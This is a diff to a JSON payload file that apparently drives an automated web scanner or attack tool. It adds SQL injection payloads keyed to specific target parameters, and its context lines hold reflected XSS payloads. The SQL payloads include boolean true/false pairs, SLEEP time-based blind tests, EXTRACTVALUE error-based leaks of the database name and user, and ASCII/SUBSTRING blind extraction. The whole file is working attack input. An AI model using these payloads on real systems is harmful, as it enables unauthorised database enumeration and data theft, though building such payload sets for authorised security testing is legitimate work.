@@ -239,5 +239,53 @@
       {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
       {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>"}
     ]
+  },
+
+  "sqli_password_sod": {
+    "sqli_boolean": [
+      {"type": "SQLI_BOOLEAN", "family": "true_dquote",     "payload": "desc\" AND \"1\"=\"1\" -- "},
+      {"type": "SQLI_BOOLEAN", "family": "false_dquote",    "payload": "desc\" AND \"1\"=\"2\" -- "},
+      {"type": "SQLI_BOOLEAN", "family": "sleep_blind",     "payload": "desc\" AND SLEEP(5) AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "error_extract",   "payload": "desc\" AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "ascii_blind",     "payload": "desc\" AND ASCII(SUBSTRING(database(),1,1))>64 AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "length_blind",    "payload": "desc\" AND LENGTH(database())>0 AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "error_user",      "payload": "desc\" AND EXTRACTVALUE(1,CONCAT(0x7e,user())) AND \"1\"=\"1"}
+    ]
+  },
+
+  "sqli_password_sop": {
+    "sqli_boolean": [
+      {"type": "SQLI_BOOLEAN", "family": "true_dquote",     "payload": "and\" AND \"1\"=\"1\" -- "},
+      {"type": "SQLI_BOOLEAN", "family": "false_dquote",    "payload": "and\" AND \"1\"=\"2\" -- "},
+      {"type": "SQLI_BOOLEAN", "family": "sleep_blind",     "payload": "and\" AND SLEEP(5) AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "error_extract",   "payload": "and\" AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "ascii_blind",     "payload": "and\" AND ASCII(SUBSTRING(database(),1,1))>64 AND \"1\"=\"1"}
+    ]
+  },
+
+  "sqli_board_wr_id": {
+    "sqli_boolean": [
+      {"type": "SQLI_BOOLEAN", "family": "true_dquote",     "payload": "1\" AND \"1\"=\"1\" -- "},
+      {"type": "SQLI_BOOLEAN", "family": "false_dquote",    "payload": "1\" AND \"1\"=\"2\" -- "},
+      {"type": "SQLI_BOOLEAN", "family": "numeric_true",    "payload": "1 AND 1=1 -- "},
+      {"type": "SQLI_BOOLEAN", "family": "numeric_false",   "payload": "1 AND 1=2 -- "},
+      {"type": "SQLI_BOOLEAN", "family": "sleep_blind",     "payload": "1\" AND SLEEP(5) AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "error_extract",   "payload": "1\" AND EXTRACTVALUE(1,CONCAT(0x7e,database())) AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "ascii_blind",     "payload": "1\" AND ASCII(SUBSTRING(database(),1,1))>64 AND \"1\"=\"1"},
+      {"type": "SQLI_BOOLEAN", "family": "error_user",      "payload": "1\" AND EXTRACTVALUE(1,CONCAT(0x7e,user())) AND \"1\"=\"1"}
+    ]
+  },
+
+  "sqli_qalist_blind": {
+    "sqli_boolean": [
+      {"type": "SQLI_BOOLEAN", "family": "true_squote",     "payload": "test' AND '1'='1' -- "},
+      {"type": "SQLI_BOOLEAN", "family": "false_squote",    "payload": "test' AND '1'='2' -- "},
+      {"type": "SQLI_BOOLEAN", "family": "tautology_or",    "payload": "test' OR '1'='1' -- "},
+      {"type": "SQLI_BOOLEAN", "family": "sleep_blind",     "payload": "test' AND SLEEP(5)-- -"},
+      {"type": "SQLI_BOOLEAN", "family": "error_extract",   "payload": "test' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+      {"type": "SQLI_BOOLEAN", "family": "ascii_blind",     "payload": "test' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
+      {"type": "SQLI_BOOLEAN", "family": "length_blind",    "payload": "test' AND LENGTH(database())>0-- -"},
+      {"type": "SQLI_BOOLEAN", "family": "error_user",      "payload": "test' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"}
+    ]
   }
 }
